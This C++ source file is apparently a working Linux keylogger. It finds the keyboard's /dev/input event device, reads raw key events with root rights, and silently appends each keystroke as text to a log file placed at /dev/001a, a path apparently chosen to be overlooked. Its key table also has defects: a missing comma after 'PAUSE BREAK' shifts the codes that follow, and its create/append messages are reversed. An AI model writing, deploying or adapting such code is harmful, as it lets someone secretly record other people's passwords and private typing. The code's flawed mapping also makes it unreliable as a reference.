#include <iostream>
#include <fstream> 
#include <vector>
#include <regex>
#include <linux/input.h>  //Needed for input_event struct
#include <fcntl.h>	//Needed for open() and O_RDONLY
#include <unistd.h>		//For close()
#include <errno.h>

namespace logger {

	std::vector<std::string> keyCodes = {
		"KEYBOARD ERROR",
		"ESC",
		"1",
		"2",
		"3",
		"4",
		"5",
		"6",
		"7",
		"8",
		"9",
		"0",
		"-",
		"=",
		"BACKSPACE",
		"TAB",
		"q",
		"w",
		"e",
		"r",
		"t",
		"y",
		"u",
		"i",
		"o",
		"p",
		"[",
		"]",
		"ENTER",
		"LEFT CNTRL",
		"a",
		"s",
		"d",
		"f",
		"g",
		"h",
		"j",
		"k",
		"l",
		";",
		"'",
		"`",
		"LEFT SHIFT",
		"\\",
		"z",
		"x",
		"c",
		"v",
		"b",
		"n",
		"m",
		",",
		".",
		"/",
		"RIGHT SHIFT",
		"KP *",
		"LEFT ALT",
		"SPACE",
		"CAPS LOCK",
		"F1",
		"F2",
		"F3",
		"F4",
		"F5",
		"F6",
		"F7",
		"F8",
		"F9",
		"F10",
		"NUM LOCK",
		"SCROLL LOCK",
		"KP HOME 7",
		"KP UP 8",
		"KP PAGE UP 9",
		"KP -",
		"KP LEFT 4",
		"KP 5",
		"KP RIGHT 6",
		"KP +", // Correct
		"KP END 1",
		"KP DOWN 2",
		"KP PAGE DOWN 3", // Correct
		"KP INS 0",
		"KP DEL .", // Correct 83
		"", //84
		"", //85
		"",//86
		"F11", // 87
		"F12", //88
		"", //89
		"",//90
		"",//91
		"", //92
		"", //93
		"", //94
		"", //95
		"KP ENTER", //96
		"RIGHT CNTRL", //97
		"KP /", //98
		"PRINT SCREEN", //99
		"RIGHT ALT", //100
		"", //101
		"HOME",//102
		"UP", //103
		"PAGE UP", //104
		"LEFT", //105
		"RIGHT", //106
		"END",//107
		"DOWN",//108
		"PAGE DOWN",//109
		"INSERT",//110
		"DELETE", //111
		"", //112
		"", //113
		"", //114
		"", //115
		"", //116
		"", //117
		"", //118
		"PAUSE BREAK" //119
		"", //120
		"", //121
		"", //122
		"", //123
		"", //124
		"LEFT META", // 125
		"", //126
		"COMPOSE"//127 RIGHT CLICK MENU
	};

	std::string getDevices(bool verbose=false) {
		char buffer[128];
		std::string result = "";

		FILE * pipe = popen("cat /proc/bus/input/devices", "r");		
		if (verbose) std::cout << "Executing command cat /proc/bus/input/devices" << std::endl;
		if (!pipe) {
			std::cout << "popen failed! Aborting program!" << std::endl;
			exit(1);
		}
		if(verbose) std::cout << "popen completed. Reading in result..." << std::endl;

		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL) {
				result += buffer;
			}
		}
		if (result == "") {
			std::cout <<"Popen return empty string. Aborting!" << std::endl;
			exit(1);
		}
		else if (verbose) {
			std::cout<<"**************************************" <<std::endl << std::endl;
			std::cout << result << std::endl;
			std::cout<<"**************************************" << std::endl;
			std::cout << std::endl;
		}
		pclose(pipe);
		return result;
	}

	std::string getHandler(std::string devices, bool verbose=false) {
		std::string handler = "";
		std::smatch m;  // flag type for determining the matching behavior (in this case on string objects)
		std::regex regexp("Handlers=sysrq kbd event[0-9]"); // regex expression for pattern to be searched
		
		std::regex_search(devices, m, regexp);
		if (verbose) std::cout << "Using regex to search for handler." << std::endl;
		if (m.size() == 0){
			std::cout << "regex search returned no match! Aborting!" << std::endl;
			exit(1);
		}
		if (verbose) std::cout << "Regex search return: " << m[0] << std::endl;
		if (verbose) std::cout << "Creating path to handler." << std::endl;
		std::string matched = m[0];
		size_t pos = matched.find("event");
		handler = "/dev/input/" + matched.substr (pos);
		if (verbose) std::cout << "Path: " << handler << std::endl;

		return handler;
	}

	bool fileExist (const std::string& name) {
		std::ifstream file(name.c_str());
		return file.good();
	}

	void connectHandler (std::string handler, bool verbose=false) {
		const char * fileName = handler.c_str();
		struct input_event holdEvent;
		if (verbose) std::cout << "Connecting to the handler..." << std::endl;
		int fd = open (fileName, O_RDONLY);

		if (fd == -1) {
			std::cout << "Error: " << std::strerror(errno) << std::endl;
			std::cout << "Tip: Be sure to run the program using sudo." << std::endl;
			std::cout << "Failed to connect to handler! Aborting!" << std::endl;
			exit(1);
		}

		if (verbose) {
			std::cout << "Success!" << std::endl;
			std::cout << "Press any key to see the corresponding scancode." << std::endl;
			std::cout << "Press ESC to exit the program." << std::endl;
		}

		std::ofstream logFile;
		if (fileExist ("/dev/001a")) {
			if (verbose) std::cout << "Creating new file: /dev/001a" << endl;
			logFile.open("/dev/001a", std::ios_base::app);
		}
		else {
			if (verbose) std::cout <<  "Appending to file: /dev/001a" << endl;
			logFile.open("/dev/001a", std::ios::out);
		} 

		if (verbose) std::cout << "To exit press ESC." << std::endl;
		while (true) {
			read(fd, &holdEvent, sizeof(holdEvent));
			
			if (holdEvent.type == EV_KEY and holdEvent.value == 1) {
				if (verbose) {
					std::cout << "holdEvent.code: " << holdEvent.code << "\t";
					std::cout << "KeyCode: " << keyCodes[holdEvent.code] << std::endl;
					logFile << keyCodes[holdEvent.code];
				}
				else {
					logFile << keyCodes[holdEvent.code];
				}
			}

			if (holdEvent.code == 1) {
				break;
			}
		}
		if (verbose) std::cout << "Closing /dev/001a" << std::endl;
		logFile.close();

		if (verbose) std::cout << "Closed connection to handler." << std::endl;
		close(fd);

		return;
	}

	void debugKeyCode(bool debug=false) {
		for (int i = 0; i < keyCodes.size(); i++) {
			std::cout << "keyCodes["<<i<<"]: " << keyCodes[i] << std::endl;
		}
	}
}